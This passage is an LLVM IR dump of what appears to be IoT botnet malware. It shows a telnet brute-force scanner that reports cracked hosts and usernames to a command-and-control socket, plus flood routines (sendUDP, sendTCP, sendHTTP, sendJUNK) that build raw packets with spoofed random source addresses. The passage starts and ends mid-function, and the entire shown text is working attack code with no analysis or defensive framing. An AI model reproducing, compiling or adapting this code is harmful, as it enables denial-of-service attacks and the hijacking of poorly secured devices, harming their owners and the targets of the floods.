; <label>:393:                                    ; preds = %388
  %394 = load i32, i32* %389, align 16
  %395 = call i32 @sclose(i32 %394)
  store i8 0, i8* %36, align 8
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %396, align 1
  br label %451

; <label>:397:                                    ; preds = %388
  store i8 102, i8* %36, align 8
  br label %451

; <label>:398:                                    ; preds = %.lr.ph
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %400 = load i32, i32* %399, align 16
  %401 = call i64 @send(i32 %400, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i64 0, i64 0), i64 49, i32 16384) #5
  %402 = icmp slt i64 %401, 0
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %398
  %404 = load i32, i32* %399, align 16
  %405 = call i32 @sclose(i32 %404)
  store i8 0, i8* %36, align 8
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %406, align 1
  br label %451

; <label>:407:                                    ; preds = %398
  store i8 103, i8* %36, align 8
  br label %451

; <label>:408:                                    ; preds = %.lr.ph
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %410 = load i32, i32* %409, align 4
  %411 = icmp eq i32 %410, 0
  br i1 %411, label %412, label %414

; <label>:412:                                    ; preds = %408
  %413 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %413, i32* %409, align 4
  br label %414

; <label>:414:                                    ; preds = %412, %408
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %416 = load i32, i32* %415, align 16
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %418 = load i8*, i8** %417, align 8
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %420 = load i16, i16* %419, align 16
  %421 = zext i16 %420 to i32
  %422 = call i32 @readUntil(i32 %416, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %418, i32 1024, i32 %421)
  %423 = icmp eq i32 %422, 0
  br i1 %423, label %439, label %424

; <label>:424:                                    ; preds = %414
  store i32 0, i32* %409, align 4
  store i16 0, i16* %419, align 16
  %425 = load i32, i32* @mainCommSock, align 4
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  %427 = load i32, i32* %426, align 4
  %428 = call i8* @inet_ntoa(i32 %427) #5
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %430 = load i8, i8* %429, align 2
  %431 = zext i8 %430 to i64
  %432 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %431
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 (i32, i8*, ...) @sockprintf(i32 %425, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i64 0, i64 0), i8* %428, i8* %433)
  %435 = load i32, i32* %415, align 16
  %436 = call i32 @sclose(i32 %435)
  store i8 0, i8* %36, align 8
  %437 = load i8*, i8** %417, align 8
  call void @llvm.memset.p0i8.i64(i8* %437, i8 0, i64 1024, i32 1, i1 false)
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %438, align 1
  br label %451

; <label>:439:                                    ; preds = %414
  %440 = load i8*, i8** %417, align 8
  %441 = call i64 @strlen(i8* %440) #15
  %442 = trunc i64 %441 to i16
  store i16 %442, i16* %419, align 16
  %443 = load i32, i32* %409, align 4
  %444 = add i32 %443, 30
  %445 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %446 = icmp ult i32 %444, %445
  br i1 %446, label %447, label %451

; <label>:447:                                    ; preds = %439
  %448 = load i32, i32* %415, align 16
  %449 = call i32 @sclose(i32 %448)
  store i8 0, i8* %36, align 8
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %450, align 1
  br label %451

; <label>:451:                                    ; preds = %.lr.ph, %187, %249, %304, %314, %324, %387, %397, %407, %84, %81, %131, %126, %161, %153, %223, %216, %291, %283, %374, %366, %447, %439, %64, %424, %403, %393, %383, %361, %320, %310, %300, %281, %277, %270, %245, %239, %212, %204, %183, %177, %151, %115, %63
  %452 = add nsw i32 %.1196, 1
  %453 = icmp slt i32 %452, %10
  %brmerge = or i1 %453, %23
  %.mux = select i1 %453, i32 %452, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %451
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #3

declare i32 @time(...) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #0 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #5
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #5
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %39 = add nsw i32 %38, %2
  %40 = sext i32 %4 to i64
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %42 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %40, i32 0, %struct.sockaddr* nonnull %41, i32 16) #5
  %43 = icmp eq i32 %.058, %5
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %.backedge
  br i1 %10, label %45, label %48

; <label>:45:                                     ; preds = %44
  %46 = call i32 @rand_cmwc()
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %18, align 2
  br label %48

; <label>:48:                                     ; preds = %45, %44
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %50 = icmp sgt i32 %49, %39
  br i1 %50, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:51:                                     ; preds = %.backedge
  %52 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %51, %48
  %.058.be = phi i32 [ %52, %51 ], [ 0, %48 ]
  br label %.backedge

; <label>:53:                                     ; preds = %22
  %54 = tail call i32 @socket(i32 2, i32 3, i32 17) #5
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i64 0, i64 0))
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  store i32 1, i32* %8, align 4
  %60 = bitcast i32* %8 to i8*
  %61 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* nonnull %60, i32 4) #5
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %59
  br label %.preheader

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.05962, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #5
  %70 = call i32 @rand() #5
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.060 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @getRandomIP(i32 %.060)
  %85 = call i32 @htonl(i32 %84) #18
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #18
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #18
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %102 = phi i32 [ %96, %95 ], [ %100, %97 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %79, i64 28
  call void @makeRandomStr(i8* %108, i32 %4)
  %109 = bitcast i8* %79 to i16*
  %110 = getelementptr inbounds i8, i8* %79, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %79, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %118 = add nsw i32 %117, %2
  %119 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %79, i64 4
  %121 = bitcast i8* %120 to i16*
  %122 = getelementptr inbounds i8, i8* %79, i64 12
  %123 = bitcast i8* %122 to i32*
  %124 = trunc i32 %1 to i16
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %101
  %.0 = phi i32 [ 0, %101 ], [ %.0.be, %.backedge61.backedge ]
  %125 = call i64 @sendto(i32 %54, i8* nonnull %79, i64 %77, i32 0, %struct.sockaddr* nonnull %119, i32 16) #5
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %94, align 4
  br i1 %10, label %128, label %130

; <label>:128:                                    ; preds = %.backedge61
  %129 = call i32 @rand_cmwc()
  br label %133

; <label>:130:                                    ; preds = %.backedge61
  %131 = call zeroext i16 @htons(i16 zeroext %124) #18
  %132 = zext i16 %131 to i32
  br label %133

; <label>:133:                                    ; preds = %130, %128
  %134 = phi i32 [ %129, %128 ], [ %132, %130 ]
  %135 = trunc i32 %134 to i16
  store i16 %135, i16* %105, align 2
  %136 = call i32 @rand_cmwc()
  %137 = trunc i32 %136 to i16
  store i16 %137, i16* %121, align 4
  %138 = call i32 @getRandomIP(i32 %.060)
  %139 = call i32 @htonl(i32 %138) #18
  store i32 %139, i32* %123, align 4
  %140 = load i16, i16* %111, align 2
  %141 = zext i16 %140 to i32
  %142 = call zeroext i16 @csum(i16* nonnull %109, i32 %141)
  store i16 %142, i16* %116, align 2
  %143 = icmp eq i32 %.0, %5
  br i1 %143, label %144, label %147

; <label>:144:                                    ; preds = %133
  %145 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %146 = icmp sgt i32 %145, %118
  br i1 %146, label %149, label %.backedge61.backedge

; <label>:147:                                    ; preds = %133
  %148 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %147, %144
  %.0.be = phi i32 [ %148, %147 ], [ 0, %144 ]
  br label %.backedge61

; <label>:149:                                    ; preds = %144
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %149, %63, %56, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8* nocapture readonly, i32) local_unnamed_addr #0 {
  %3 = alloca [80 x i8], align 16
  %4 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %5 = add nsw i32 %4, %1
  %6 = getelementptr inbounds [80 x i8], [80 x i8]* %3, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %6, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.39, i64 0, i64 0), i64 18, i32 1, i1 false)
  %7 = call i8* @strcat(i8* nonnull %6, i8* %0) #5
  %strlen = call i64 @strlen(i8* nonnull %6)
  %endptr = getelementptr [80 x i8], [80 x i8]* %3, i64 0, i64 %strlen
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.40, i64 0, i64 0), i64 14, i32 1, i1 false)
  %8 = call %struct._IO_FILE* @popen(i8* nonnull %6, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %10 = icmp sgt i32 %5, %9
  br i1 %10, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = call i32 @system(i8* nonnull %6) #5
  %12 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %13 = icmp sgt i32 %5, %12
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @popen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #3

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #0 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #5
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #5
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #5
  %145 = call i32 @getRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #18
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #0 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #5
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
